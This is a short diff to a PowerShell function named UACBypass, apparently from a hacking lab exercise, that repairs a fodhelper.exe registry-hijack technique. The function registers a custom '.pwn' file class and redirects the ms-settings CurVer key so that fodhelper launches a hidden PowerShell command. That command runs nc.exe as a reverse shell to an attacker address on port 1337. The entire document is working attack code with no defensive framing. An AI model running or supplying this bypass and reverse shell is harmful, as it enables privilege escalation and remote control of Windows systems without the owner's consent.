@@ -5,10 +5,12 @@
 
 function UACBypass {
     $CMD = "powershell -windowstyle hidden C:\Windows\Temp\nc.exe YOURIP 1337 -e cmd"
-    
-    Set-ItemProperty -Path "HKCU\Software\Classes\.thm\Shell\Open\command" -Name "" -Value $CMD -Force
-    
-    Set-ItemProperty -Path "HKCU\Software\Classes\ms-settings\CurVer" -Name "" -Value ".thm" -Force
-    
-    Start-Process -FilePath "fodhelper.exe"
+
+    New-Item "HKCU:\Software\Classes\.pwn\Shell\Open\command" -Force
+    Set-ItemProperty "HKCU:\Software\Classes\.pwn\Shell\Open\command" -Name "(default)" -Value $CMD -Force
+
+    New-Item -Path "HKCU:\Software\Classes\ms-settings\CurVer" -Force
+    Set-ItemProperty "HKCU:\Software\Classes\ms-settings\CurVer" -Name "(default)" -Value ".pwn" -Force
+
+    Start-Process -FilePath "C:\Windows\System32\fodhelper.exe" -WindowStyle Hidden
 }
